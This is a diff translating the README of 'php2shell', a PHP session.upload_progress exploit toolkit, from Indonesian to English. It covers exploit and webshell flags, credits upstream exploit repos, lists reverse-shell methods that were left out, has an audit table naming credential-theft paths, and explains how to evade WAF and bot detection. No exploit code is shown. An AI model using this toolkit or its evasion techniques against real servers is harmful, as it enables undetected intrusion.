-| `--no-upload-progress` | skip probe upload_progress saat detect |
-| `--no-display-errors` | skip probe display_errors saat detect |
-| `--json / --csv` | output file laporan |
-| `-v, --verbose` | tampilkan tiap request (status, durasi, ukuran body, error) |
+| `--ja3 {chrome,safari,firefox,edge,android}` | browser TLS+UA profile (default chrome) |
+| `--delay N` | delay between requests + jitter (default 1.0s; jitter 0.75–1.35×) |
+| `--timeout N` | HTTP timeout per request (default 15s) |
+| `--proxy URL` | go through a proxy, e.g. `http://127.0.0.1:8080` |
+| `--audit FILE` | log EVERY request to JSONL (evidence + troubleshooting) |
+| `--no-upload-progress` | skip the upload_progress probe during detect |
+| `--no-display-errors` | skip the display_errors probe during detect |
+| `--json / --csv` | report file output |
+| `-v, --verbose` | show every request (status, duration, body size, error) |
 
-### Flag lanjutan (scan & exploit)
+### Advanced flags (scan & exploit)
 
-| Flag | Fungsi |
+| Flag | Function |
 |---|---|
-| `--quiet` | perkecil output rantai (kebalikan `-v`) |
-| `--cve {CVE-2026-109619}` | pilih CVE yang ditembak (hanya 109619; nilai lain ditolak — 109618 tidak diimplementasikan) |
-| `--fetch URL` | URL yang di-fetch lewat RCE setelah eksekusi (kanal baca hasil) |
-| `--proof-file NAME` | bentuk `-c 'id>/out/NAME'` lalu bacakan hasilnya (nama `[A-Za-z0-9_-]{1,24}`; kanal bukti) |
-| `--output-file FILE` | tulis output mentah rantai ke file |
-| `--offsets-file FILE` | pakai profil offset dari file; `''` = jangan pakai profil lab |
-| `--no-auto-offsets` | jangan cari offset otomatis (paksa pakai `--zif-offset`/`--dtor-offset`) |
-| `--no-pre-rotate` | jangan rotate worker sebelum preflight |
-| `--no-retry-rotate` | jangan rotate worker saat retry |
+| `--quiet` | shrink the chain output (the opposite of `-v`) |
+| `--cve {CVE-2026-109619}` | pick the CVE to fire (109619 only; other values are rejected — 109618 is not implemented) |
+| `--fetch URL` | URL fetched through the RCE after execution (a channel to read the result) |
+| `--proof-file NAME` | does `-c 'id>/out/NAME'` and then reads the result back (name `[A-Za-z0-9_-]{1,24}`; the proof channel) |
+| `--output-file FILE` | write the raw chain output to a file |
+| `--offsets-file FILE` | use an offset profile from a file; `''` = do not use the lab profile |
+| `--no-auto-offsets` | do not look for offsets automatically (force `--zif-offset`/`--dtor-offset`) |
+| `--no-pre-rotate` | do not rotate the worker before preflight |
+| `--no-retry-rotate` | do not rotate the worker on retry |
 
-### Flag mode `detect` / `preflight`
+### `detect` / `preflight` mode flags
 
-| Flag | Fungsi |
+| Flag | Function |
 |---|---|
-| `-u, --urls URL [URL ...]` | satu atau lebih URL langsung |
-| `-l, --list FILE` | atau baca daftar URL dari file `.txt` |
+| `-u, --urls URL [URL ...]` | one or more URLs directly |
+| `-l, --list FILE` | or read a URL list from a `.txt` file |
 
-### Flag mode `shell`
+### `shell` mode flags
 
-| Flag | Fungsi |
+| Flag | Function |
 |---|---|
-| `--out DIR` | folder keluaran webshell (default `shell/`) |
-| `--ttl JAM` | masa berlaku webshell dalam jam (default 72) |
-| `--commands "a,b,c"` | whitelist perintah di webshell (default `id,whoami`) |
-| `--author NAMA` | tanda tangan author di header webshell |
-| `--purpose TEKS` | keterangan tujuan di header webshell |
+| `--out DIR` | webshell output folder (default `shell/`) |
+| `--ttl HOURS` | webshell lifetime in hours (default 72) |
+| `--commands "a,b,c"` | command whitelist inside the webshell (default `id,whoami`) |
+| `--author NAME` | author signature in the webshell header |
+| `--purpose TEXT` | purpose note in the webshell header |
 
 ---
 
-## ❖ Sumber repo — bukan fork, tapi turunan beberapa repo
+## ❖ Repo sources — not a fork, but a derivative of several repos
 
-Repo ini **bukan fork**. Tidak ada satu repo pun yang bisa di-fork lalu jadi
-php2shell, karena bahannya diambil dari **empat sumber berbeda** (tiga repo
-publik + dua advisori resmi). Karena itu sumbernya dicantumkan satu per satu
-di sini, bukan lewat mekanisme "forked from".
+This repo is **not a fork**. There is no single repo that could be forked to become
+php2shell, because the material is taken from **four different sources** (three public
+repos + two official advisories). That is why the sources are listed one by one
+here, instead of through a "forked from" mechanism.
 
-### Repo yang diambil
+### Repos we took from
 
-| # | Repo | Penulis | Yang diambil dari sini | Lisensi |
+| # | Repo | Author | What was taken from it | License |
 |---|---|---|---|---|
-| 1 | `https://github.com/9bie/php2shell-bypass-aslr-exp` | **9bie (Qi Deng)** | **Rantai inti**: 2-request `session.upload_progress` UAF (CVE-2026-109619), ASLR bypass lewat heap + `libphp` base leak, aktuator `pDestructor = zif_system`. `lib/chain.py` = port logikanya jadi modul in-process. | tidak ada file lisensi (hak cipta default) |
-| 2 | `https://github.com/Zer061/CVE-2026-109618` | **Zer061** (+ v.dir.mir, 9bie) | Fork tempat `exploit.py` acuan byte-level kami diambil (sha256 `ea925683…`). Riwayatnya campuran: `adc5f9b` oleh 9bie, `5fc5669` oleh v.dir.mir (**menambah `--revshell`**), `4752adc` oleh Zer061. **Sudah di-takedown GitHub.** | tidak ada file lisensi |
-| 3 | `https://github.com/ikow/php2shell-poc` | **ikow** | Verifikator crash CVE-2026-109618 (`poc/verify_oom_trigger.py`). | dirujuk, tidak di-vendor |
-| 4 | `curl_cffi` — `https://github.com/lexiforest/curl_cffi` | lexiforest / yifeikong | JA3/TLS impersonation di `lib/transport.py`. | MIT (dependency) |
+| 1 | `https://github.com/9bie/php2shell-bypass-aslr-exp` | **9bie (Qi Deng)** | **The core chain**: 2-request `session.upload_progress` UAF (CVE-2026-109619), ASLR bypass via heap + `libphp` base leak, actuator `pDestructor = zif_system`. `lib/chain.py` = a port of that logic into an in-process module. | no license file (default copyright) |
+| 2 | `https://github.com/Zer061/CVE-2026-109618` | **Zer061** (+ v.dir.mir, 9bie) | The fork our byte-level `exploit.py` reference was taken from (sha256 `ea925683…`). Its history is mixed: `adc5f9b` by 9bie, `5fc5669` by v.dir.mir (**added `--revshell`**), `4752adc` by Zer061. **Already taken down by GitHub.** | no license file |
+| 3 | `https://github.com/ikow/php2shell-poc` | **ikow** | The CVE-2026-109618 crash verifier (`poc/verify_oom_trigger.py`). | referenced, not vendored |
+| 4 | `curl_cffi` — `https://github.com/lexiforest/curl_cffi` | lexiforest / yifeikong | JA3/TLS impersonation in `lib/transport.py`. | MIT (dependency) |
 
-### Dua repo pembanding (dibaca, tidak di-vendor)
+### Two comparison repos (read, not vendored)
 
-Dua repo ini **tidak** kami ambil kodenya — dibaca untuk pembanding, dan satu
-di antaranya menyumbang **data** yang kami adopsi (tabel dukungan build).
-Disebut di sini supaya jelas mana yang kode dan mana yang pengukuran.
+We did **not** take code from these two repos — they were read for comparison, and one
+of them contributed **data** that we adopted (the build support table).
+They are named here so it is clear which part is code and which part is measurement.
 
-| Repo | Yang kami ambil | Yang TIDAK kami ambil |
+| Repo | What we took | What we did NOT take |
 |---|---|---|
-| `https://github.com/devploit/php2shell` (devploit, MIT) | **Tabel 13 profil heap** → `lib/build_support.py`: build mana yang RCE, mana yang cuma leak, per arsitektur. Ini pengukuran mereka, dan mereka dikreditkan di header modul. | Kode. Juga **tidak** kami ikut menyebut `CVE-2026-115560` — nomor itu tidak ada di MITRE/NVD/daftar advisori `php/php-src`. |
-| `https://github.com/murrez/php2shell` (murrez, MIT) | Tidak ada yang diadopsi ke kode. | Kode. `poc.py` 4.411 baris tidak di-vendor; klaim `CVE-2026-115560` sebagai "headline" tidak kami ulang. |
+| `https://github.com/devploit/php2shell` (devploit, MIT) | **The 13 heap profile table** → `lib/build_support.py`: which builds are RCE, which only leak, per architecture. This is their measurement, and they are credited in the module header. | Code. We also did **not** follow them in citing `CVE-2026-115560` — that number does not exist in MITRE/NVD/`php/php-src` advisory lists. |
+| `https://github.com/murrez/php2shell` (murrez, MIT) | Nothing was adopted into the code. | Code. The 4,411-line `poc.py` is not vendored; we do not repeat their claim of `CVE-2026-115560` as the "headline". |
 
-Yang menarik dari `devploit` dan kami catat di `ATTRIBUTION.md`: mereka
-menyelesaikan masalah lisensi 9bie dengan cara **tidak** menyalin kode sama
-sekali — `bootstrap_upstream.py` hanya meng-clone commit tertentu saat runtime.
-Kami tidak bisa memakai jalan itu (mesin rantai harus jalan offline), tapi
-polanya benar.
+What is interesting about `devploit`, and what we noted in `ATTRIBUTION.md`: they
+solved 9bie's licensing problem by **not** copying code at all —
+`bootstrap_upstream.py` only clones a specific commit at runtime.
+We could not take that route (the chain engine has to run offline), but
+the pattern is right.
 
-### Advisori & data resmi
+### Advisories & official data
 
-| Sumber | Yang diambil |
+| Source | What was taken |
 |---|---|
-| `GHSA-w8hw-w9fx-j79w` (PHP Group) | CVE-2026-109618 — OOM dalam `session.upload_progress` |
-| `GHSA-6wmf-4rv5-p3rp` (PHP Group) | CVE-2026-109619 — UAF di `php_session_initialize()` |
+| `GHSA-w8hw-w9fx-j79w` (PHP Group) | CVE-2026-109618 — OOM inside `session.upload_progress` |
+| `GHSA-6wmf-4rv5-p3rp` (PHP Group) | CVE-2026-109619 — UAF in `php_session_initialize()` |
 | php.net changelog 8.4.27 | fix-floor 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
 
-### Kredit riset — siapa menemukan, siapa menuliskan
+### Research credits — who found it, who wrote it down
 
-Tool ini **tidak mengklaim penemuan CVE**. Yang menemukan adalah **Wiz
-Research**, dan itu harus disebut lebih dulu sebelum nama-nama yang menulis
-kode.
+This tool **does not claim discovery of the CVEs**. The discoverer is **Wiz
+Research**, and that has to be said before the names of the people who wrote the
+code.
 
-| Nama | Peran |
+| Name | Role |
 |---|---|
-| **Wiz Research** | Penemu dan analis publik PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — [blog](https://www.wiz.io/blog/php2shell-php-rce). Semua yang ada di repo ini bermula dari publikasi itu. |
-| **Calif** | Riset paralel, analisis amplifikasi metadata upload ([calif.io](https://calif.io/research/wp2root)). |
-| **9bie (Qi Deng)** | Exploit publik pertama + riset heap grooming: leak stage-1/2, carrier fake HashTable stage-3. Rantai di `lib/chain.py` adalah port logikanya. |
-| **Karasawa2025** | Arah `display_errors=Off` — primitif OOM-di-cookie dan strategi leak alternatif. |
-| **v.dir.mir** | Menambahkan `--revshell` pada `exploit.py` acuan (commit `5fc5669`). Fitur itu **tidak** kami port. |
-| **Zer061** | Fork tempat `exploit.py` acuan byte-level kami diambil (sha256 `ea925683…`). |
-| **ikow** | Verifikator OOM CVE-2026-109618 (`poc/verify_oom_trigger.py`). |
-| **devploit** | Tabel 13 profil heap → `lib/build_support.py`, dan pola lisensi `bootstrap_upstream.py`. |
-| **Assetnote / Searchlight Cyber** (Shubham Shah, Adam Kues, Patrik Grobshäuser) | Metodologi deteksi aktif pada [`assetnote/php2shell-scanner`](https://github.com/assetnote/php2shell-scanner) + [write-up Searchlight](https://www.slcyber.io/research/high-fidelity-detection-mechanism-for-php2shell-cve-2026-109618-and-cve-2026-109619): probe OOM bertingkat 1/8/20 MiB dengan kunci nested-62, sinyal `fatal-in-parser`/`empty-500-differential`/`worker-abort`, dan catering `memory_limit` false-positive → diadopsi menjadi `lib/oomprobe.py` (mode `detect` otomatis; `--no-oom` untuk menonaktifkan). |
-| **calif.io** | [Write-up asli php2shell](https://calif.io/php2shell/) pertama yang merinci kondisi exploitasi mod_php & php-fpm — dirujuk oleh scanner assetnote sebagai basis triase. |
-| **PHP Group** | Advisori + perbaikan di 8.4.27 / 8.5.12. |
+| **Wiz Research** | Discoverer and public analyst of PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — [blog](https://www.wiz.io/blog/php2shell-php-rce). Everything in this repo starts from that publication. |
+| **Calif** | Parallel research, analysis of upload metadata amplification ([calif.io](https://calif.io/research/wp2root)). |
+| **9bie (Qi Deng)** | First public exploit + heap grooming research: stage-1/2 leak, stage-3 fake HashTable carrier. The chain in `lib/chain.py` is a port of that logic. |
+| **Karasawa2025** | The `display_errors=Off` direction — the OOM-in-cookie primitive and an alternative leak strategy. |
+| **v.dir.mir** | Added `--revshell` to the reference `exploit.py` (commit `5fc5669`). That feature was **not** ported here. |
+| **Zer061** | The fork our byte-level `exploit.py` reference was taken from (sha256 `ea925683…`). |
+| **ikow** | OOM verifier for CVE-2026-109618 (`poc/verify_oom_trigger.py`). |
+| **devploit** | The 13 heap profile table → `lib/build_support.py`, and the `bootstrap_upstream.py` licensing pattern. |
+| **Assetnote / Searchlight Cyber** (Shubham Shah, Adam Kues, Patrik Grobshäuser) | The active detection methodology in [`assetnote/php2shell-scanner`](https://github.com/assetnote/php2shell-scanner) + the [Searchlight write-up](https://www.slcyber.io/research/high-fidelity-detection-mechanism-for-php2shell-cve-2026-109618-and-cve-2026-109619): staged 1/8/20 MiB OOM probes with nested-62 keys, the `fatal-in-parser`/`empty-500-differential`/`worker-abort` signals, and catching the `memory_limit` false-positive → adopted as `lib/oomprobe.py` (automatic in `detect` mode; `--no-oom` to disable). |
+| **calif.io** | The [original php2shell write-up](https://calif.io/php2shell/), the first to detail the exploitation conditions of mod_php & php-fpm — referenced by the assetnote scanner as a triage basis. |
+| **PHP Group** | Advisories + the fixes in 8.4.27 / 8.5.12. |
 
-Kalau ada kredit yang kurang atau keliru, buka issue — itu kalimat devploit,
-dan kami ikut memakainya karena memang begitu seharusnya.
+If a credit is missing or wrong, open an issue — that is devploit's sentence,
+and we use it too because that is exactly how it should be.
 
-Yang sengaja **tidak** dikutip: `WoYinDao` (disebut devploit, tapi tidak ada
-jejak publik yang bisa kami verifikasi) dan `CVE-2026-115560` (404 di MITRE,
-0 hasil di NVD) — nomor itu dipakai `murrez` sebagai headline, dan tidak kami
-ulang.
+Deliberately **not** cited: `WoYinDao` (mentioned by devploit, but we found no
+public trace we could verify) and `CVE-2026-115560` (404 at MITRE,
+0 results at NVD) — that number is used by `murrez` as a headline, and we do not
+repeat it.
 
-### Kenapa tidak bisa di-fork
+### Why it cannot be forked
 
-Fork = satu garis keturunan git. Di sini:
+A fork = a single git lineage. Here:
 
-- rantai eksploitasi datang dari **9bie** (repo 1), tapi build-nya `exploit.py`
-  kami ambil dari **fork Zer061** (repo 2) yang riwayatnya sendiri campuran
-  tiga penulis;
-- verifikasi kerentanan CVE-2026-109618 dari **ikow** (repo 3);
-- semantik versi & fix-floor dari **advisori PHP Group** (bukan repo);
+- the exploit chain comes from **9bie** (repo 1), but the build of `exploit.py`
+  was taken from **Zer061's fork** (repo 2), whose own history is a mix of
+  three authors;
+- the vulnerability verification for CVE-2026-109618 comes from **ikow** (repo 3);
+- the version semantics & fix-floor come from the **PHP Group advisories** (not a repo);
 
-Tidak ada satu pun dari mereka yang bisa jadi "parent" tunggal. Yang kami tulis
-sendiri: CLI 7 mode, engine in-process `lib/chain.py`, auto-proof baca `out/p1`,
-pagar perintah, skor preflight, mode stealth, 81 unit test, installer, lab Docker.
+None of them can be the single "parent". What we wrote
+ourselves: the 7-mode CLI, the in-process engine `lib/chain.py`, auto-proof reading of `out/p1`,
+the command fence, the preflight score, stealth mode, 81 unit tests, the installer, the Docker lab.
 
-### Kenapa `--revshell` tidak ada di sini
+### Why `--revshell` is not here
 
-`exploit.py` acuan kami (sha256 `ea925683…`, dari repo 2) **mengandung reverse
-shell** yang ditambahkan commit `5fc5669` oleh **v.dir.mir**:
+Our reference `exploit.py` (sha256 `ea925683…`, from repo 2) **contains a reverse
+shell** added by commit `5fc5669` by **v.dir.mir**:
 
-- payload `bash` lewat `/dev/tcp/{ip}/{port}`
-- payload `python3` pty spawn
-- payload `perl` socket exec
-- listener `nc` yang menyerahkan shell interaktif
+- a `bash` payload via `/dev/tcp/{ip}/{port}`
+- a `python3` pty spawn payload
+- a `perl` socket exec payload
+- an `nc` listener that hands over an interactive shell
 
-Ini fitur terdokumentasi, **bukan trojan tersembunyi** — tapi ini juga alasan
-sah GitHub men-takedown repo asalnya. Kami tidak mengadopsinya:
+This is a documented feature, **not a hidden trojan** — but it is also the legitimate
+reason GitHub took down the originating repo. We did not adopt it:
 
 | Upstream | php2shell |
 |---|---|
-| `--revshell IP:PORT` | **tidak terdaftar di argparse** |
-| payload `bash`/`python`/`perl` | tidak bisa dikirim (batas 14 byte + whitelist) |
-| `sh</out/c` | `<` dan `>` ditolak sebagai operator |
-| listener `nc` | **tidak diimplementasikan** |
+| `--revshell IP:PORT` | **not registered in argparse** |
+| `bash`/`python`/`perl` payloads | cannot be sent (14 byte cap + whitelist) |
+| `sh</out/c` | `<` and `>` are rejected as operators |
+| `nc` listener | **not implemented** |
 
-### Hasil audit forensik — SELURUH riwayat git (2026-10-24)
+### Forensic audit result — the ENTIRE git history (2026-10-24)
 
-Bukan hanya working tree: **semua 384 blob dari 19 commit** diekstrak dan
-dipindai. Laporan penuh: `AUDIT_FORENSIK_Zer061_2026-10-24.md` (SSD lab).
+Not just the working tree: **all 384 blobs from 19 commits** were extracted and
+scanned. Full report: `AUDIT_FORENSIK_Zer061_2026-10-24.md` (lab SSD).
 
-| Pemeriksaan | Hasil |
+| Check | Result |
 |---|---|
-| C2 / host eksternal hardcoded | **tidak ada** — hanya `hub.docker.com` di README, `127.0.0.1`, `localhost` |
-| Pencurian kredensial (`~/.ssh`, `.aws`, `/etc/shadow`, `.netrc`) | **tidak ada** |
-| Persistence (`crontab`, `systemd`, `rc.local`, autostart) | **tidak ada** |
-| Obfuscation (`b64decode`, hex blob, `chr()` chain, keylogger) | **tidak ada** — `\x..` = byte array protokol |
-| Binary tak dikenal | **tidak ada** — hanya `php-8.4.26.tar.gz` resmi + 1 PNG |
-| `scp` ke host luar | **tidak ada** — hanya `172.16.1.112` (RFC1918, VM lab penulis) |
-| **`--revshell` + payload + listener `nc`** | **ADA di source acuan** — **diblokir total di sini** |
+| C2 / hardcoded external hosts | **none** — only `hub.docker.com` in the README, `127.0.0.1`, `localhost` |
+| Credential theft (`~/.ssh`, `.aws`, `/etc/shadow`, `.netrc`) | **none** |
+| Persistence (`crontab`, `systemd`, `rc.local`, autostart) | **none** |
+| Obfuscation (`b64decode`, hex blob, `chr()` chain, keylogger) | **none** — `\x..` = the protocol byte array |
+| Unknown binaries | **none** — only the official `php-8.4.26.tar.gz` + 1 PNG |
+| `scp` to an outside host | **none** — only `172.16.1.112` (RFC1918, the author's lab VM) |
+| **`--revshell` + payloads + `nc` listener** | **PRESENT in the reference source** — **fully blocked here** |
 
-Kata "pristine" di dokumen lama artinya **tidak diubah oleh kami**, bukan
-**tidak berbahaya**. Kalau kamu fork repo ini, **diff dulu sebelum percaya** —
-aturan yang sama kami pakai ke upstream.
+The word "pristine" in older documents means **not modified by us**, not
+**harmless**. If you fork this repo, **diff first before trusting** — the same
+rule we applied to upstream.
 
 ---
 
@@ -687,24 +690,24 @@ expose every tuning knob the chain has.
 
 ## ❖ Stealth / anti-bot detection
 
-Request yang dikirim ini sengaja dibikin **kelihatan seperti browser asli**, bukan script:
+The requests it sends are deliberately made to **look like a real browser**, not a script:
 
-| Lapisan | Apa yang dilakukan |
+| Layer | What it does |
 |---|---|
-| **TLS/JA3 fingerprint** | `curl_cffi` me-replay handshake browser asli (JA3 + ALPN + extensions persis) — script Python standar bikin JA3 aneh yang langsung ketahuan WAF, ini tidak |
-| **Profil browser lengkap** | `--ja3 chrome` (default), `safari`, `firefox`, `edge`, `android` — TLS + User-Agent + Accept-Language konsisten satu identitas |
-| **Header tampilan normal** | `Accept`, `Accept-Encoding`, `Sec-Fetch-*`, `Upgrade-Insecure-Requests` — persis urutan/isian browser, bukan default `requests`/`urllib` |
-| **Rotasi identitas** | profil bergilir antar request → trafik dari 1 IP tidak selalu profil sama (seperti pengguna nyata beda device) |
-| **Timing manusiawi** | jeda antar request + jitter acak (0,75×–1,35×) — pola kirim robot yang pas-pasan gampang ke-score |
-| **Retry sopan** | backoff eksponensial (2→4→8 detik), bukan nge-brut |
-| **Audit trail lokal** | semua request tercatat di file JSONL (`--audit`) — kamu bisa audit sendiri apa yang terkirim |
+| **TLS/JA3 fingerprint** | `curl_cffi` replays a real browser handshake (JA3 + ALPN + extensions exactly) — a standard Python script produces a strange JA3 that a WAF spots instantly; this one does not |
+| **Complete browser profile** | `--ja3 chrome` (default), `safari`, `firefox`, `edge`, `android` — TLS + User-Agent + Accept-Language consistent as one identity |
+| **Normal-looking headers** | `Accept`, `Accept-Encoding`, `Sec-Fetch-*`, `Upgrade-Insecure-Requests` — exactly a browser's order and contents, not `requests`/`urllib` defaults |
+| **Identity rotation** | profiles rotate between requests → traffic from 1 IP is not always the same profile (like a real user on different devices) |
+| **Human timing** | delay between requests + random jitter (0.75×–1.35×) — a perfectly regular robot cadence is easy to score |
+| **Polite retries** | exponential backoff (2→4→8 seconds), not brute force |
+| **Local audit trail** | every request is recorded in a JSONL file (`--audit`) — you can audit for yourself exactly what was sent |
 
 ```bash
-# contoh: pakai identitas Safari + lewat proxy + jeda 3 detik antar request
+# example: use the Safari identity + go through a proxy + 3 second delay between requests
 php2shell exploit -u <url> --ja3 safari --proxy http://127.0.0.1:8080 --delay 3 --yes
 ```
 
-**Batas terukurnya:** ini lolos deteksi *script-vs-browser* klasik (JA3, header, pola timing). Kalau target pakai bot-management berat (Cloudflare Bot Management, Akamai) yang mengecek HTTP/2 frame-order, cookie history, bahkan render JS — itu perlombaan senjata lain dan tool ini tidak mengklaim menang di sana. Untuk lab PHP prefork & mayoritas server biasa: cukup aman. 😉
+**Its measurable limit:** this gets past classic *script-vs-browser* detection (JA3, headers, timing patterns). If the target uses heavy bot-management (Cloudflare Bot Management, Akamai) that inspects HTTP/2 frame order, cookie history, or even JS rendering — that is a different arms race and this tool does not claim to win there. For a PHP prefork lab & the majority of ordinary servers: safe enough. 😉
 
 ---
 
@@ -789,9 +792,9 @@ commands, no shells, no exfil primitives) reflects that scope.
 
 ## ❖ Repository layout
 
-> 📘 **Panduan pemakaian:** [`docs/TUTORIAL.md`](docs/TUTORIAL.md) — tutorial
-> setiap fitur langkah-demi-langkah (semuanya diuji live), termasuk
-> RCE → up-shell. Runbook teknis: [`docs/RUNBOOK_RCE_UPSHELL.md`](docs/RUNBOOK_RCE_UPSHELL.md).
+> 📘 **Usage guide:** [`docs/TUTORIAL.md`](docs/TUTORIAL.md) — a step-by-step
+> tutorial for every feature (all of them tested live), including
+> RCE → up-shell. Technical runbook: [`docs/RUNBOOK_RCE_UPSHELL.md`](docs/RUNBOOK_RCE_UPSHELL.md).
 
 ```text
 php2shell/
@@ -803,15 +806,15 @@ php2shell/
 │   ├── transport.py      curl_cffi JA3 transport + rate limit + audit log
 │   ├── detect.py         fingerprint: version, SAPI, upload_progress…
 │   ├── preflight.py      readiness score; detection ≠ gate
-│   ├── build_support.py  tabel RCE / leak-saja / belum-terbukti per build
-│   ├── memprobe.py       baca memory_limit target lewat 1 request
+│   ├── build_support.py  RCE / leak-only / unproven table per build
+│   ├── memprobe.py       read the target memory_limit through 1 request
 │   ├── exploit_runner.py orchestration + command fence + auto-proof
 │   ├── reporter.py       JSON / CSV / terminal tables
 │   └── banner.py         the skull ASCII
 ├── shell/                password-protected webshell GENERATOR
 ├── lab/lab_docker.sh     author-config vulnerable lab, one command
 ├── docker/               php.ini / apache.conf / www / offsets.py
-├── docs/                 SYARAT_TARGET.md — apa yang menentukan rantai jalan
+├── docs/                 SYARAT_TARGET.md — what makes the chain work
 ├── tests/                81 unit tests
 └── gambar/               screenshot
 ```
@@ -839,16 +842,16 @@ is intentional — this toolkit proves impact; it does not weaponize beyond proo
 ---
 
 <div align="center">
-<sub><b>Penemu CVE:</b> Calif (Ryan A.) — temuan pertama 1 Agu 2026, lapor 11 Agu ·
-Wiz Research — temuan independen 19 Agu 2026 ·
-OpenAI Codex Security (Amy Burnett) — vektor tambahan, lapor 18 Sep 2026<br>
-<b>Kode &amp; riset yang jadi dasar:</b> 9bie (Qi Deng) — exploit publik &amp; heap grooming ·
-Karasawa2025 — arah <code>display_errors=Off</code> ·
-v.dir.mir — <code>--revshell</code> pada acuan ·
-Zer061 — fork acuan <code>exploit.py</code> ·
-ikow — verifikator OOM ·
-devploit — tabel 13 profil heap<br>
-<b>Advisori &amp; perbaikan:</b> PHP Group — GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp<br>
+<sub><b>CVE discoverers:</b> Calif (Ryan A.) — first finding 1 Aug 2026, reported 11 Aug ·
+Wiz Research — independent finding 19 Aug 2026 ·
+OpenAI Codex Security (Amy Burnett) — additional vector, reported 18 Sep 2026<br>
+<b>Code &amp; research this builds on:</b> 9bie (Qi Deng) — public exploit &amp; heap grooming ·
+Karasawa2025 — the <code>display_errors=Off</code> direction ·
+v.dir.mir — <code>--revshell</code> in the reference ·
+Zer061 — the reference <code>exploit.py</code> fork ·
+ikow — OOM verifier ·
+devploit — the 13 heap profile table<br>
+<b>Advisories &amp; fixes:</b> PHP Group — GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp<br>
 reproduction, tooling &amp; hardening by <b>aarsaputra</b><br>
-<sub>Kredit kurang atau keliru? Buka issue.</sub></sub>
+<sub>A credit missing or wrong? Open an issue.</sub></sub>
 </div>
